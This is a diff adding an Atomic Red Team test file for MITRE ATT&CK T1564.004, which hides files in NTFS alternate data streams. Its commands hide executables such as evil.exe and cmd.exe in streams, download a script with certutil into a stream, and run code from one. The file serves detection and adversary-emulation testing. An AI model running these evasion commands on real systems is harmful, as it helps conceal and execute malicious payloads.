@@ -1,0 +1,125 @@
+attack_technique: T1564.004
+display_name: 'Hide Artifacts: NTFS File Attributes'
+atomic_tests:
+- name: Alternate Data Streams (ADS)
+  auto_generated_guid: 8822c3b0-d9f9-4daf-a043-49f4602364f4
+  description: |
+    Execute from Alternate Streams
+
+    [Reference - 1](https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f)
+
+    [Reference - 2](https://oddvar.moe/2018/01/14/putting-data-in-alternate-data-streams-and-how-to-execute-it/)
+  supported_platforms:
+  - windows
+  input_arguments:
+    path:
+      description: Path of ADS file
+      type: path
+      default: c:\ADS\
+  executor:
+    command: |
+      type C:\temp\evil.exe > "C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:evil.exe"
+      extrac32 #{path}\procexp.cab #{path}\file.txt:procexp.exe
+      findstr /V /L W3AllLov3DonaldTrump #{path}\procexp.exe > #{path}\file.txt:procexp.exe
+      certutil.exe -urlcache -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1564.004/src/test.ps1 c:\temp:ttt
+      makecab #{path}\autoruns.exe #{path}\cabtest.txt:autoruns.cab
+      print /D:#{path}\file.txt:autoruns.exe #{path}\Autoruns.exe
+      reg export HKLM\SOFTWARE\Microsoft\Evilreg #{path}\file.txt:evilreg.reg
+      regedit /E #{path}\file.txt:regfile.reg HKEY_CURRENT_USER\MyCustomRegKey
+      expand \\webdav\folder\file.bat #{path}\file.txt:file.bat
+      esentutl.exe /y #{path}\autoruns.exe /d #{path}\file.txt:autoruns.exe /o
+    name: command_prompt
+    elevation_required: true
+- name: Store file in Alternate Data Stream (ADS)
+  auto_generated_guid: 2ab75061-f5d5-4c1a-b666-ba2a50df5b02
+  description: |
+    Storing files in Alternate Data Stream (ADS) similar to Astaroth malware.
+    Upon execution cmd will run and attempt to launch desktop.ini. No windows remain open after the test
+  supported_platforms:
+  - windows
+  input_arguments:
+    payload_path:
+      description: Path of file to hide in ADS
+      type: path
+      default: c:\windows\system32\cmd.exe
+    ads_file_path:
+      description: Path of file to create an ADS under
+      type: path
+      default: C:\Users\Public\Libraries\yanki\desktop.ini
+    ads_name:
+      description: Name of ADS
+      type: string
+      default: desktop.ini
+  executor:
+    command: |
+      if (!(Test-Path C:\Users\Public\Libraries\yanki -PathType Container)) {
+          New-Item -ItemType Directory -Force -Path C:\Users\Public\Libraries\yanki
+          }
+      Start-Process -FilePath "$env:comspec" -ArgumentList "/c,type,#{payload_path},>,`"#{ads_file_path}:#{ads_name}`""
+    cleanup_command: |
+      Remove-Item "#{ads_file_path}" -Force -ErrorAction Ignore
+    name: powershell
+
+- name: Create ADS command prompt
+  auto_generated_guid: 17e7637a-ddaf-4a82-8622-377e20de8fdb
+  description: |
+    Create an Alternate Data Stream with the command prompt. Write access is required. Upon execution, run "dir /a-d /s /r | find ":$DATA"" in the %temp%
+    folder to view that the alternate data stream exists. To view the data in the alternate data stream, run "notepad T1564.004_has_ads.txt:adstest.txt"
+  supported_platforms:
+  - windows
+  input_arguments:
+    file_name:
+      description: File name of file to create ADS on.
+      type: string
+      default: '%temp%\T1564.004_has_ads_cmd.txt'
+    ads_filename:
+      description: Name of ADS file.
+      type: string
+      default: adstest.txt
+  dependency_executor_name: command_prompt
+  dependencies:
+  - description: |
+      The file must exist on disk at specified location (#{file_name})
+    prereq_command: |
+      IF EXIST #{file_name} ( EXIT 0 ) ELSE ( EXIT 1 )
+    get_prereq_command: |
+      echo normal_text >> #{file_name} >nul 2>&1
+  executor:
+    command: |
+      echo cmd /c echo "Shell code execution."> #{file_name}:#{ads_filename}
+      for /f "usebackq delims=?" %i in (#{file_name}:#{ads_filename}) do %i
+    cleanup_command: |
+      del #{file_name} >nul 2>&1
+    name: command_prompt
+- name: Create ADS PowerShell
+  auto_generated_guid: 0045ea16-ed3c-4d4c-a9ee-15e44d1560d1
+  description: |
+    Create an Alternate Data Stream with PowerShell. Write access is required. To verify execution, the the command "ls -Recurse | %{ gi $_.Fullname -stream *} | where stream -ne ':$Data' | Select-Object pschildname"
+    in the %temp% direcotry to view all files with hidden data streams. To view the data in the alternate data stream, run "notepad.exe T1564.004_has_ads_powershell.txt:adstest.txt" in the %temp% folder.
+  supported_platforms:
+  - windows
+  input_arguments:
+    file_name:
+      description: File name of file to create ADS on.
+      type: string
+      default: $env:TEMP\T1564.004_has_ads_powershell.txt
+    ads_filename:
+      description: Name of ADS file.
+      type: string
+      default: adstest.txt
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      The file must exist on disk at specified location (#{file_name})
+    prereq_command: |
+      if (Test-Path #{file_name}) { exit 0 } else { exit 1 }
+    get_prereq_command: |
+      New-Item -Path #{file_name} | Out-Null
+  executor:
+    command: |
+      echo "test" > #{file_name} | set-content -path test.txt -stream #{ads_filename} -value "test"
+      set-content -path #{file_name} -stream #{ads_filename} -value "test2"
+      set-content -path . -stream #{ads_filename} -value "test3"
+    cleanup_command: |
+      Remove-Item -Path #{file_name} -ErrorAction Ignore
+    name: powershell
